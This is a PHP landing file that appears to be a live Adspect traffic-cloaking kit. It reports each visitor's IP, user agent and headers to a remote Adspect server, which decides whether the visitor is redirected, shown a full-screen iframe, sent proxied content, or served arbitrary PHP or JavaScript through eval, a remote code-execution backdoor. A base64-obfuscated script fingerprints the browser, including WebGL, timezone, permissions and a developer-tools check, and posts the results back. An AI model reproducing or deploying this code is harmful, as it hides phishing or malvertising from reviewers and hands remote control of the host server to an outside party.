<?php
 ini_set('display_errors', '0'); error_reporting(E_ALL); if (!function_exists('adspect')) { function adspect_exit($code, $message) { http_response_code($code); exit($message); } function adspect_dig($array, $key, $default = '') { return array_key_exists($key, $array) ? $array[$key] : $default; } function adspect_resolve_path($path) { if ($path[0] === DIRECTORY_SEPARATOR) { $path = adspect_dig($_SERVER, 'DOCUMENT_ROOT', __DIR__) . $path; } else { $path = __DIR__ . DIRECTORY_SEPARATOR . $path; } return realpath($path); } function adspect_spoof_request($url) { $_SERVER['REQUEST_METHOD'] = 'GET'; $_POST = []; $query = parse_url($url, PHP_URL_QUERY); if (is_string($query)) { parse_str($query, $_GET); $_SERVER['QUERY_STRING'] = $query; } } function adspect_try_files() { foreach (func_get_args() as $path) { if (is_file($path)) { if (!is_readable($path)) { adspect_exit(403, 'Permission denied'); } switch (strtolower(pathinfo($path, PATHINFO_EXTENSION))) { case 'php': case 'html': case 'htm': case 'phtml': case 'php5': case 'php4': case 'php3': adspect_execute($path); exit; default: header('Content-Type: ' . adspect_content_type($path)); header('Content-Length: ' . filesize($path)); readfile($path); exit; } } } adspect_exit(404, 'File not found'); } function adspect_execute() { global $_adspect; require_once func_get_arg(0); } function adspect_content_type($path) { if (function_exists('mime_content_type')) { $type = mime_content_type($path); if (is_string($type)) { return $type; } } return 'application/octet-stream'; } function adspect_serve_local($url) { $path = (string)parse_url($url, PHP_URL_PATH); if ($path === '') { return null; } $path = adspect_resolve_path($path); if (is_string($path)) { adspect_spoof_request($url); if (is_dir($path)) { chdir($path); adspect_try_files('index.php', 'index.html', 'index.htm'); return; } chdir(dirname($path)); adspect_try_files($path); return; } adspect_exit(404, 'File not found'); } function adspect_tokenize($str, $sep) { $toks = []; $tok = strtok($str, $sep); while ($tok !== false) { $toks[] = $tok; $tok = strtok($sep); } return $toks; } function adspect_x_forwarded_for() { if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER)) { $xff = adspect_tokenize($_SERVER['HTTP_X_FORWARDED_FOR'], ', '); } elseif (array_key_exists('HTTP_CF_CONNECTING_IP', $_SERVER)) { $xff = [$_SERVER['HTTP_CF_CONNECTING_IP']]; } elseif (array_key_exists('HTTP_X_REAL_IP', $_SERVER)) { $xff = [$_SERVER['HTTP_X_REAL_IP']]; } else { $xff = []; } if (array_key_exists('REMOTE_ADDR', $_SERVER)) { $xff[] = $_SERVER['REMOTE_ADDR']; } return array_unique($xff); } function adspect_headers() { $headers = []; foreach ($_SERVER as $key => $value) { if (!strncmp('HTTP_', $key, 5)) { $header = strtr(strtolower(substr($key, 5)), '_', '-'); $headers[$header] = $value; } } return $headers; } function adspect_crypt($in, $key) { $il = strlen($in); $kl = strlen($key); $out = ''; for ($i = 0; $i < $il; ++$i) { $out .= chr(ord($in[$i]) ^ ord($key[$i % $kl])); } return $out; } function adspect_proxy_headers() { $headers = []; foreach (func_get_args() as $key) { if (array_key_exists($key, $_SERVER)) { $header = strtr(strtolower(substr($key, 5)), '_', '-'); $headers[] = "{$header}: {$_SERVER[$key]}"; } } return $headers; } function adspect_proxy($url, $xff, $param = null, $key = null) { $url = parse_url($url); if (empty($url)) { adspect_exit(500, 'Invalid proxy URL'); } extract($url); $curl = curl_init(); curl_setopt($curl, CURLOPT_FORBID_REUSE, true); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($curl, CURLOPT_TIMEOUT, 60); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_ENCODING , ''); curl_setopt($curl, CURLOPT_USERAGENT, adspect_dig($_SERVER, 'HTTP_USER_AGENT', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36')); curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); if (!isset($scheme)) { $scheme = 'http'; } if (!isset($host)) { $host = adspect_dig($_SERVER, 'HTTP_HOST', 'localhost'); } if (isset($user, $pass)) { curl_setopt($curl, CURLOPT_USERPWD, "$user:$pass"); $host = "$user:$pass@$host"; } if (isset($port)) { curl_setopt($curl, CURLOPT_PORT, $port); $host = "$host:$port"; } $origin = "$scheme://$host"; if (!isset($path)) { $path = '/'; } if ($path[0] !== '/') { $path = "/$path"; } $url = $path; if (isset($query)) { $url .= "?$query"; } curl_setopt($curl, CURLOPT_URL, $origin . $url); $headers = adspect_proxy_headers('HTTP_ACCEPT', 'HTTP_ACCEPT_ENCODING', 'HTTP_ACCEPT_LANGUAGE', 'HTTP_COOKIE'); if ($xff !== '') { $headers[] = "X-Forwarded-For: {$xff}"; } if (!empty($headers)) { curl_setopt($curl, CURLOPT_HTTPHEADER, $headers); } $data = curl_exec($curl); if ($errno = curl_errno($curl)) { adspect_exit(500, 'curl error: ' . curl_strerror($errno)); } $code = curl_getinfo($curl, CURLINFO_HTTP_CODE); $type = curl_getinfo($curl, CURLINFO_CONTENT_TYPE); curl_close($curl); http_response_code($code); if (is_string($data)) { if (isset($param, $key) && preg_match('{^text/(?:html|css)}i', $type)) { $base = $path; if ($base[-1] !== '/') { $base = dirname($base); } $base = rtrim($base, '/'); $rw = function ($m) use ($origin, $base, $param, $key) { list($repl, $what, $url) = $m; $url = parse_url($url); if (!empty($url)) { extract($url); if (isset($host)) { if (!isset($scheme)) { $scheme = 'http'; } $host = "$scheme://$host"; if (isset($user, $pass)) { $host = "$user:$pass@$host"; } if (isset($port)) { $host = "$host:$port"; } } else { $host = $origin; } if (!isset($path)) { $path = ''; } if (!strlen($path) || $path[0] !== '/') { $path = "$base/$path"; } if (!isset($query)) { $query = ''; } $host = base64_encode(adspect_crypt($host, $key)); parse_str($query, $query); $query[$param] = "$path#$host"; $repl = '?' . http_build_query($query); if (isset($fragment)) { $repl .= "#$fragment"; } if ($what[-1] === '=') { $repl = "\"$repl\""; } $repl = $what . $repl; } return $repl; }; $re = '{(href=|src=|url\()["\']?((?:https?:|(?!#|[[:alnum:]]+:))[^"\'[:space:]>)]+)["\']?}i'; $data = preg_replace_callback($re, $rw, $data); } } else { $data = ''; } header("Content-Type: $type"); header('Content-Length: ' . strlen($data)); echo $data; } function adspect($sid, $mode, $param, $key) { if (!function_exists('curl_init')) { adspect_exit(500, 'curl extension is missing'); } $xff = adspect_x_forwarded_for(); $addr = adspect_dig($xff, 0); $xff = implode(', ', $xff); if (array_key_exists($param, $_GET) && strpos($_GET[$param], '#') !== false) { list($url, $host) = explode('#', $_GET[$param], 2); $host = adspect_crypt(base64_decode($host), $key); unset($_GET[$param]); $query = http_build_query($_GET); $url = "$host$url?$query"; adspect_proxy($url, $xff, $param, $key); exit; } $ajax = intval($mode === 'ajax'); $curl = curl_init(); $sid = adspect_dig($_GET, '__sid', $sid); $ua = adspect_dig($_SERVER, 'HTTP_USER_AGENT'); $referrer = adspect_dig($_SERVER, 'HTTP_REFERER'); $query = http_build_query($_GET); if ($_SERVER['REQUEST_METHOD'] == 'POST') { $payload = json_decode($_POST['data'], true); $payload['headers'] = adspect_headers(); curl_setopt($curl, CURLOPT_POST, true); curl_setopt($curl, CURLOPT_POSTFIELDS, json_encode($payload)); } if ($ajax) { header('Access-Control-Allow-Origin: *'); $cid = adspect_dig($_SERVER, 'HTTP_X_REQUEST_ID'); } else { $cid = adspect_dig($_COOKIE, '_cid'); } curl_setopt($curl, CURLOPT_FORBID_REUSE, true); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($curl, CURLOPT_TIMEOUT, 60); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_ENCODING , ''); curl_setopt($curl, CURLOPT_HTTPHEADER, [ 'Accept: application/json', "X-Forwarded-For: {$xff}", "X-Forwarded-Host: {$_SERVER['HTTP_HOST']}", "X-Request-ID: {$cid}", "Adspect-IP: {$addr}", "Adspect-UA: {$ua}", "Adspect-JS: {$ajax}", "Adspect-Referrer: {$referrer}", ]); curl_setopt($curl, CURLOPT_URL, "https://rpc.adspect.net/v2/{$sid}?{$query}"); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); $json = curl_exec($curl); if ($errno = curl_errno($curl)) { adspect_exit(500, 'curl error: ' . curl_strerror($errno)); } $code = curl_getinfo($curl, CURLINFO_HTTP_CODE); curl_close($curl); header('Cache-Control: no-store'); switch ($code) { case 200: case 202: $data = json_decode($json, true); if (!is_array($data)) { adspect_exit(500, 'Invalid backend response'); } global $_adspect; $_adspect = $data; extract($data); if ($ajax) { switch ($action) { case 'php': ob_start(); eval($target); $data['target'] = ob_get_clean(); $json = json_encode($data); break; } if ($_SERVER['REQUEST_METHOD'] === 'POST') { header('Content-Type: application/json'); echo $json; } else { header('Content-Type: application/javascript'); echo "window._adata={$json};"; return $target; } } else { if ($js) { setcookie('_cid', $cid, time() + 60); return $target; } switch ($action) { case 'local': return adspect_serve_local($target); case 'noop': adspect_spoof_request($target); return null; case '301': case '302': case '303': header("Location: {$target}", true, (int)$action); break; case 'xar': header("X-Accel-Redirect: {$target}"); break; case 'xsf': header("X-Sendfile: {$target}"); break; case 'refresh': header("Refresh: 0; url={$target}"); break; case 'meta': $target = htmlspecialchars($target); echo "<!DOCTYPE html><head><meta http-equiv=\"refresh\" content=\"0; url={$target}\"></head>"; break; case 'iframe': $target = htmlspecialchars($target); echo "<!DOCTYPE html><iframe src=\"{$target}\" style=\"width:100%;height:100%;position:absolute;top:0;left:0;z-index:999999;border:none;\"></iframe>"; break; case 'proxy': adspect_proxy($target, $xff, $param, $key); break; case 'fetch': adspect_proxy($target, $xff); break; case 'return': if (is_numeric($target)) { http_response_code((int)$target); } else { adspect_exit(500, 'Non-numeric status code'); } break; case 'php': eval($target); break; case 'js': $target = htmlspecialchars(base64_encode($target)); echo "<!DOCTYPE html><body><script src=\"data:text/javascript;base64,{$target}\"></script></body>"; break; } } exit; case 404: adspect_exit(404, 'Stream not found'); default: adspect_exit($code, 'Backend response code ' . $code); } } } $target = adspect('51251575-a464-49ae-bc70-b1df81babf78', 'redirect', '_', base64_decode('CoBNZXokxCDeKplRwVIVZoC9AliosoIG0MPr63dpax4=')); if (!isset($target)) { return; } ?>
<!DOCTYPE html>
<html>
<head>
	<meta http-equiv="refresh" content="10; url=<?= htmlspecialchars($target) ?>">
	<meta name="referrer" content="no-referrer">
</head>
<body>
	<script src="data:text/javascript;base64,dmFyIF8weDNmNGU9Wydsb2cnLCd0eXBlJywnVU5NQVNLRURfVkVORE9SX1dFQkdMJywnbGVuZ3RoJywnM3l5a01ZWicsJ25hdmlnYXRvcicsJ2hpZGRlbicsJ2dldE93blByb3BlcnR5TmFtZXMnLCdVTk1BU0tFRF9SRU5ERVJFUl9XRUJHTCcsJ2JvZHknLCdzY3JlZW4nLCdxdWVyeScsJ2RvY3VtZW50RWxlbWVudCcsJ2NhbnZhcycsJ2dldFBhcmFtZXRlcicsJ2NyZWF0ZUV2ZW50Jywnd2luZG93JywnaHJlZicsJzc2MjE3OUlibEh3YycsJzRpVXBJd1UnLCdsb2NhdGlvbicsJ2lucHV0JywncHVzaCcsJzJDT3p0T2YnLCdnZXRFeHRlbnNpb24nLCdmdW5jdGlvbicsJ2FjdGlvbicsJ2dldFRpbWV6b25lT2Zmc2V0JywnZXJyb3JzJywnMUtEZUVhYScsJ1BPU1QnLCdzdWJtaXQnLCc2NDVIZEpuWkonLCc5MTE0MTJmaXpWQ2EnLCc0NTAwMDJzSGpPbFonLCc4MDA4M2dwWkxmVycsJ21ldGhvZCcsJzExMzc4MEZ6Vk9UUycsJ3RpbWV6b25lT2Zmc2V0JywnNzkzaG55Y2RFJywnMTY4ODk3Y1ZXaXR1JywnZ2V0Q29udGV4dCcsJ3RoZW4nLCdjbG9zdXJlJywnY3JlYXRlRWxlbWVudCcsJ3ZhbHVlJywndG9zdHJpbmcnLCdjb25zb2xlJywndG9TdHJpbmcnLCdhdHRyaWJ1dGVzJywnbm90aWZpY2F0aW9ucycsJ21lc3NhZ2UnLCdhcHBlbmRDaGlsZCcsJ3N0cmluZ2lmeScsJ3N0YXRlJywnd2ViZ2wnLCdub2RlTmFtZScsJ3Blcm1pc3Npb25zJywnTm90aWZpY2F0aW9uJywnV0VCR0xfZGVidWdfcmVuZGVyZXJfaW5mbyddO3ZhciBfMHgxNjlmPWZ1bmN0aW9uKF8weGI5MjUyZixfMHgzYThiMGIpe18weGI5MjUyZj1fMHhiOTI1MmYtMHhiMTt2YXIgXzB4M2Y0ZTk2PV8weDNmNGVbXzB4YjkyNTJmXTtyZXR1cm4gXzB4M2Y0ZTk2O307KGZ1bmN0aW9uKF8weDQyN2VlNixfMHgyMjJhYjQpe3ZhciBfMHg0NjlmZTA9XzB4MTY5Zjt3aGlsZSghIVtdKXt0cnl7dmFyIF8weDRiYjQxZT1wYXJzZUludChfMHg0NjlmZTAoMHhiMykpK3BhcnNlSW50KF8weDQ2OWZlMCgweGM5KSkqLXBhcnNlSW50KF8weDQ2OWZlMCgweGUxKSkrLXBhcnNlSW50KF8weDQ2OWZlMCgweGM2KSkqcGFyc2VJbnQoXzB4NDY5ZmUwKDB4YjQpKStwYXJzZUludChfMHg0NjlmZTAoMHhjNCkpKi1wYXJzZUludChfMHg0NjlmZTAoMHhiOCkpK3BhcnNlSW50KF8weDQ2OWZlMCgweGMyKSkrcGFyc2VJbnQoXzB4NDY5ZmUwKDB4YzEpKSotcGFyc2VJbnQoXzB4NDY5ZmUwKDB4YzgpKSstcGFyc2VJbnQoXzB4NDY5ZmUwKDB4YzMpKSotcGFyc2VJbnQoXzB4NDY5ZmUwKDB4YmUpKTtpZihfMHg0YmI0MWU9PT1fMHgyMjJhYjQpYnJlYWs7ZWxzZSBfMHg0MjdlZTZbJ3B1c2gnXShfMHg0MjdlZTZbJ3NoaWZ0J10oKSk7fWNhdGNoKF8weDEwNjJjNSl7XzB4NDI3ZWU2WydwdXNoJ10oXzB4NDI3ZWU2WydzaGlmdCddKCkpO319fShfMHgzZjRlLDB4NzdhOTMpLGZ1bmN0aW9uKCl7dmFyIF8weDJjMGQyND1fMHgxNjlmO2Z1bmN0aW9uIF8weDE2YTVmOSgpe3ZhciBfMHgxOGNmZGY9XzB4MTY5ZjtfMHg1YjU0Y2RbXzB4MThjZmRmKDB4YmQpXT1fMHg0ZjUyY2U7dmFyIF8weDVkNzc5Mz1kb2N1bWVudFtfMHgxOGNmZGYoMHhjZCldKCdmb3JtJyksXzB4NDAzYzdhPWRvY3VtZW50WydjcmVhdGVFbGVtZW50J10oXzB4MThjZmRmKDB4YjYpKTtfMHg1ZDc3OTNbXzB4MThjZmRmKDB4YzUpXT1fMHgxOGNmZGYoMHhiZiksXzB4NWQ3NzkzW18weDE4Y2ZkZigweGJiKV09d2luZG93W18weDE4Y2ZkZigweGI1KV1bXzB4MThjZmRmKDB4YjIpXSxfMHg0MDNjN2FbXzB4MThjZmRmKDB4ZGUpXT1fMHgxOGNmZGYoMHhlMyksXzB4NDAzYzdhWyduYW1lJ109J2RhdGEnLF8weDQwM2M3YVtfMHgxOGNmZGYoMHhjZSldPUpTT05bXzB4MThjZmRmKDB4ZDYpXShfMHg1YjU0Y2QpLF8weDVkNzc5M1tfMHgxOGNmZGYoMHhkNSldKF8weDQwM2M3YSksZG9jdW1lbnRbXzB4MThjZmRmKDB4ZTYpXVsnYXBwZW5kQ2hpbGQnXShfMHg1ZDc3OTMpLF8weDVkNzc5M1tfMHgxOGNmZGYoMHhjMCldKCk7fXZhciBfMHg0ZjUyY2U9W10sXzB4NWI1NGNkPXt9O3RyeXt2YXIgXzB4NWJhZjVlPWZ1bmN0aW9uKF8weDVhYWU2NCl7dmFyIF8weDc1NGFlNT1fMHgxNjlmO2lmKCdvYmplY3QnPT09dHlwZW9mIF8weDVhYWU2NCYmbnVsbCE9PV8weDVhYWU2NCl7dmFyIF8weDRmZTg4MT1mdW5jdGlvbihfMHgxMTFhN2Ipe3ZhciBfMHgyM2Y1YzQ9XzB4MTY5Zjt0cnl7dmFyIF8weDM4NDhhOD1fMHg1YWFlNjRbXzB4MTExYTdiXTtzd2l0Y2godHlwZW9mIF8weDM4NDhhOCl7Y2FzZSdvYmplY3QnOmlmKG51bGw9PT1fMHgzODQ4YTgpYnJlYWs7Y2FzZSBfMHgyM2Y1YzQoMHhiYSk6XzB4Mzg0OGE4PV8weDM4NDhhOFsndG9TdHJpbmcnXSgpO31fMHg1OGNhOTFbXzB4MTExYTdiXT1fMHgzODQ4YTg7fWNhdGNoKF8weDE0NDM4NCl7XzB4NGY1MmNlW18weDIzZjVjNCgweGI3KV0oXzB4MTQ0Mzg0WydtZXNzYWdlJ10pO319LF8weDU4Y2E5MT17fSxfMHgzYmJlNzA7Zm9yKF8weDNiYmU3MCBpbiBfMHg1YWFlNjQpXzB4NGZlODgxKF8weDNiYmU3MCk7dHJ5e3ZhciBfMHgxYzQyNzc9T2JqZWN0W18weDc1NGFlNSgweGU0KV0oXzB4NWFhZTY0KTtmb3IoXzB4M2JiZTcwPTB4MDtfMHgzYmJlNzA8XzB4MWM0Mjc3W18weDc1NGFlNSgweGUwKV07KytfMHgzYmJlNzApXzB4NGZlODgxKF8weDFjNDI3N1tfMHgzYmJlNzBdKTtfMHg1OGNhOTFbJyEhJ109XzB4MWM0Mjc3O31jYXRjaChfMHgxYzJjZTIpe18weDRmNTJjZVtfMHg3NTRhZTUoMHhiNyldKF8weDFjMmNlMltfMHg3NTRhZTUoMHhkNCldKTt9cmV0dXJuIF8weDU4Y2E5MTt9fTtfMHg1YjU0Y2RbXzB4MmMwZDI0KDB4ZTcpXT1fMHg1YmFmNWUod2luZG93W18weDJjMGQyNCgweGU3KV0pLF8weDViNTRjZFtfMHgyYzBkMjQoMHhiMSldPV8weDViYWY1ZSh3aW5kb3cpLF8weDViNTRjZFtfMHgyYzBkMjQoMHhlMildPV8weDViYWY1ZSh3aW5kb3dbXzB4MmMwZDI0KDB4ZTIpXSksXzB4NWI1NGNkW18weDJjMGQyNCgweGI1KV09XzB4NWJhZjVlKHdpbmRvd1tfMHgyYzBkMjQoMHhiNSldKSxfMHg1YjU0Y2RbXzB4MmMwZDI0KDB4ZDApXT1fMHg1YmFmNWUod2luZG93W18weDJjMGQyNCgweGQwKV0pLF8weDViNTRjZFtfMHgyYzBkMjQoMHhlOSldPWZ1bmN0aW9uKF8weDVmMWQxMSl7dmFyIF8weDEwYWViND1fMHgyYzBkMjQ7dHJ5e3ZhciBfMHg1MDM3YzQ9e307XzB4NWYxZDExPV8weDVmMWQxMVtfMHgxMGFlYjQoMHhkMildO2Zvcih2YXIgXzB4NGZjYTdlIGluIF8weDVmMWQxMSlfMHg0ZmNhN2U9XzB4NWYxZDExW18weDRmY2E3ZV0sXzB4NTAzN2M0W18weDRmY2E3ZVtfMHgxMGFlYjQoMHhkOSldXT1fMHg0ZmNhN2VbJ25vZGVWYWx1ZSddO3JldHVybiBfMHg1MDM3YzQ7fWNhdGNoKF8weDViMjFkMyl7XzB4NGY1MmNlW18weDEwYWViNCgweGI3KV0oXzB4NWIyMWQzWydtZXNzYWdlJ10pO319KGRvY3VtZW50W18weDJjMGQyNCgweGU5KV0pLF8weDViNTRjZFsnZG9jdW1lbnQnXT1fMHg1YmFmNWUoZG9jdW1lbnQpO3RyeXtfMHg1YjU0Y2RbXzB4MmMwZDI0KDB4YzcpXT1uZXcgRGF0ZSgpW18weDJjMGQyNCgweGJjKV0oKTt9Y2F0Y2goXzB4MzNkZWIzKXtfMHg0ZjUyY2VbXzB4MmMwZDI0KDB4YjcpXShfMHgzM2RlYjNbXzB4MmMwZDI0KDB4ZDQpXSk7fXRyeXtfMHg1YjU0Y2RbXzB4MmMwZDI0KDB4Y2MpXT1mdW5jdGlvbigpe31bXzB4MmMwZDI0KDB4ZDEpXSgpO31jYXRjaChfMHg2YWJkNjIpe18weDRmNTJjZVtfMHgyYzBkMjQoMHhiNyldKF8weDZhYmQ2MlsnbWVzc2FnZSddKTt9dHJ5e18weDViNTRjZFsndG91Y2hFdmVudCddPWRvY3VtZW50W18weDJjMGQyNCgweGVjKV0oJ1RvdWNoRXZlbnQnKVtfMHgyYzBkMjQoMHhkMSldKCk7fWNhdGNoKF8weDI0ZTdiNil7XzB4NGY1MmNlW18weDJjMGQyNCgweGI3KV0oXzB4MjRlN2I2W18weDJjMGQyNCgweGQ0KV0pO310cnl7XzB4NWJhZjVlPWZ1bmN0aW9uKCl7fTt2YXIgXzB4MmQ1YTMyPTB4MDtfMHg1YmFmNWVbXzB4MmMwZDI0KDB4ZDEpXT1mdW5jdGlvbigpe3JldHVybisrXzB4MmQ1YTMyLCcnO30sY29uc29sZVtfMHgyYzBkMjQoMHhkZCldKF8weDViYWY1ZSksXzB4NWI1NGNkW18weDJjMGQyNCgweGNmKV09XzB4MmQ1YTMyO31jYXRjaChfMHg0NjE2MmMpe18weDRmNTJjZVsncHVzaCddKF8weDQ2MTYyY1tfMHgyYzBkMjQoMHhkNCldKTt9d2luZG93W18weDJjMGQyNCgweGUyKV1bXzB4MmMwZDI0KDB4ZGEpXVtfMHgyYzBkMjQoMHhlOCldKHsnbmFtZSc6XzB4MmMwZDI0KDB4ZDMpfSlbXzB4MmMwZDI0KDB4Y2IpXShmdW5jdGlvbihfMHg1MzE0ZDEpe3ZhciBfMHgxMTNkNWY9XzB4MmMwZDI0O18weDViNTRjZFtfMHgxMTNkNWYoMHhkYSldPVt3aW5kb3dbXzB4MTEzZDVmKDB4ZGIpXVsncGVybWlzc2lvbiddLF8weDUzMTRkMVtfMHgxMTNkNWYoMHhkNyldXSxfMHgxNmE1ZjkoKTt9LF8weDE2YTVmOSk7dHJ5e3ZhciBfMHhlZGQwZDQ9ZG9jdW1lbnRbXzB4MmMwZDI0KDB4Y2QpXShfMHgyYzBkMjQoMHhlYSkpW18weDJjMGQyNCgweGNhKV0oXzB4MmMwZDI0KDB4ZDgpKSxfMHg1N2M4MmY9XzB4ZWRkMGQ0W18weDJjMGQyNCgweGI5KV0oXzB4MmMwZDI0KDB4ZGMpKTtfMHg1YjU0Y2RbJ3dlYmdsJ109eyd2ZW5kb3InOl8weGVkZDBkNFtfMHgyYzBkMjQoMHhlYildKF8weDU3YzgyZltfMHgyYzBkMjQoMHhkZildKSwncmVuZGVyZXInOl8weGVkZDBkNFsnZ2V0UGFyYW1ldGVyJ10oXzB4NTdjODJmW18weDJjMGQyNCgweGU1KV0pfTt9Y2F0Y2goXzB4NGIxNmZmKXtfMHg0ZjUyY2VbXzB4MmMwZDI0KDB4YjcpXShfMHg0YjE2ZmZbXzB4MmMwZDI0KDB4ZDQpXSk7fX1jYXRjaChfMHgzMmZiN2Ype18weDRmNTJjZVtfMHgyYzBkMjQoMHhiNyldKF8weDMyZmI3ZlsnbWVzc2FnZSddKSxfMHgxNmE1ZjkoKTt9fSgpKTs="></script>
</body>
</html>
<?php exit;